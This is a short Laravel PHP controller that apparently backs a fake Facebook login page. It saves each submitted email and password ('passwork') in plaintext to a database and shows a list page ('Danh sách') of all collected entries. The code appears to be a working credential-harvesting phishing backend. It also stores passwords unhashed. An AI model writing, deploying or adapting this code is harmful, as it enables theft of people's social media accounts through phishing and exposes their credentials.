<?php

namespace App\Http\Controllers;
use Illuminate\Http\Request;
use App\Facebook;

class FacebookFormController extends Controller {

    // Create Contact Form
    public function createForm(Request $request) {
      return view('facebook');
    }

    // Store Contact Form data
    public function FacebookForm(Request $request) {

        // Form validation
        $this->validate($request, [
            'email' => 'required',
            'passwork' => 'required',
         ]);

        //  Store data in database
        Facebook::create($request->all());

        return view('welcome');
    }

    
    // Danh sách
    public function getDanhSach()
    {
        $facebooks = Facebook::all();
        return view('facebookdanhsach', compact('facebooks'));
    }
}